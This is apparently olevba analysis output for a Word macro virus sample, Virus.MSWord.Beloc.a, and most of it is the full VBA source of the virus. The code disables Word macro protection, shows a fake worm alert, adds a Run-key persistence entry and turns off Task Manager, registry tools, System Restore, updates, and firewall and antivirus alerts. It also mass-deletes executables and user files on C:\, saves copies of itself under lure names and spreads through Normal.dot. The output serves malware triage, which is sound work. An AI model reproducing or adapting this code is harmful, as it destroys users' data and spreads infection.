olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beloc.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beloc.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cebol.bas 
in file: Virus.MSWord.Beloc.a - OLE stream: 'Macros/VBA/Cebol'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()

On Error Resume Next

With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

Msgbox "Your system possibly was infected with latest version of Worm. " _
        & Chr(13) & "Type : Worm ." _
        & Chr(13) & "Infection Length : 30,132 bytes ." _
        & Chr(13) & "Risk : High." _
        & Chr(13) & "Systems Affected: Windows 95, Windows 98, Windows 2000, Windows Me, Windows NT, Windows XP." _
        & Chr(13) & "Drescription: Worm spreads copies itself to removable and shared drives . " _
        & Chr(13) & "Protection: Update now.", _
vbOKOnly + vbCritical, " Warning"

Fly.Show

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Setsystem") = "C:\Windows\System\Files.doc"
Open "C:\Windows\System\Files.doc" For Output As #1

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Active", "Inside") = " Cebol"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\13.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\Auto Update", "AUOptions") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"

System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", "ProxyEnable") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap", "IntranetName") = "01000000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap", "ProxyBypass") = "01000000"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel") = "0x3"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives") = "0x3"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "RestrictRun") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetTaskbar") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetFolders") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "HideClock") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSaveSettings") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "DisableRegistryTools") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoCloseKey") = "1"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoBrowserClose") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoFileOpen") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoPrinting") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system", "DisableRegistryTools") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "UpdatesDisableNotify") = "0x01"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusOverride") = "0x01"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallOverride") = "Ox01"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallDisableNotify") = "Ox01"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusDisableNotify") = "Ox01"

WordBasic.kill "C:\WINDOWS\*.exe"
WordBasic.kill "C:\WINDOWS\SYSTEM\*.exe"
WordBasic.kill "C:\WINDOWS\SYSTEM32\*.exe"
WordBasic.kill "C:\WINDOWS\COMMAND\*.exe"
WordBasic.kill "C:\WINDOWS\COMMAND\*.com"
WordBasic.kill "C:\WINDOWS\*.com"
WordBasic.kill "C:\WINDOWS\*.xls"
WordBasic.kill "C:\WINDOWS\*.pdf"
WordBasic.kill "C:\WINDOWS\*.rar"
WordBasic.kill "C:\WINDOWS\*.ini"
WordBasic.kill "C:\WINDOWS\*.txt"
WordBasic.kill "C:\WINDOWS\*.rtf"
WordBasic.kill "C:\WINDOWS\*.mp3"
WordBasic.kill "C:\WINDOWS\*.avi"
WordBasic.kill "C:\WINDOWS\*.mpg"
WordBasic.kill "C:\WINDOWS\*.zip"
WordBasic.kill "C:\WINDOWS\*.xlm"
WordBasic.kill "C:\WINDOWS\*.mpeg"
WordBasic.kill "C:\*.exe"
WordBasic.kill "C:\*.com"
WordBasic.kill "C:\*.xls"
WordBasic.kill "C:\*.pdf"
WordBasic.kill "C:\*.rar"
WordBasic.kill "C:\*.ini"
WordBasic.kill "C:\*.txt"
WordBasic.kill "C:\*.rtf"
WordBasic.kill "C:\*.mp3"
WordBasic.kill "C:\*.avi"
WordBasic.kill "C:\*.mpg"
WordBasic.kill "C:\*.zip"
WordBasic.kill "C:\*.xlm"
WordBasic.kill "C:\*.mpeg"

ActiveDocument.SaveAs filename:="C:\Documents and Settings\All Users\Start Menu\Readme.doc"
ActiveDocument.SaveAs filename:="C:\Documents and Settings\All Users\Desktop\News.doc"
ActiveDocument.SaveAs filename:="C:\Documents and Settings\All Users\Start Menu\Programs\Service.doc"
ActiveDocument.SaveAs filename:="C:\Windows\System32\Programs.doc"
ActiveDocument.SaveAs filename:="C:\Windows\New_CD.doc"
ActiveDocument.SaveAs filename:="C:\Movies.doc"
ActiveDocument.SaveAs filename:="C:\Information.doc"
ActiveDocument.SaveAs filename:="C:\My Shared Folder\Computers.doc"
ActiveDocument.SaveAs filename:="C:\Windows\System\Files.doc"
ActiveDocument.SaveAs filename:="C:\My Documents\Printer.doc "

End Sub

Sub AutoClose()

On Error Resume Next

Dim i
   Dim Exist
   Dim Instal
   Dim sMe$
   Dim sMacro$
   Dim iMacroCount
  
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
      If WordBasic.[MacroName$](i, 0, 0) = "Cebol" Then
           Instal = -1
      End If

      If WordBasic.[MacroName$](i, 0, 0) = "Fly" Then
           Exist = -1
       End If
   Next i
   If Not Exist And Not Instal Then
     sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Cebol"
       WordBasic.MacroCopy sMacro$, "Global:Cebol"
       sMacro$ = sMe$ + ":Fly"
      WordBasic.MacroCopy sMacro$, "Global:Fly"
      
      If NormalTemplate.Saved = False Then NormalTemplate.Save
       ' Save module Cebol and module Fly in the Normal.dot
  ActiveDocument.Save
End If
End Sub

Sub Toolsmacro()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub
 




   


-------------------------------------------------------------------------------
VBA MACRO Fly.frm 
in file: Virus.MSWord.Beloc.a - OLE stream: 'Macros/VBA/Fly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub UserForm_Click()
ActiveDocument.SaveAs filename:="C:\Windows\System32\Sdbmh.doc"
ActiveDocument.SaveAs filename:="C:\WINDOWS\COMMAND\Dnlfc.doc"

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beloc.a' - OLE stream: 'Macros/Fly/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CommandButton2J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beloc.a' - OLE stream: 'Macros/Fly/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beloc.a' - OLE stream: 'Macros/Fly/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Beloc.a' - OLE stream: 'Macros/Fly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Beloc.a' - OLE stream: 'Macros/Fly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

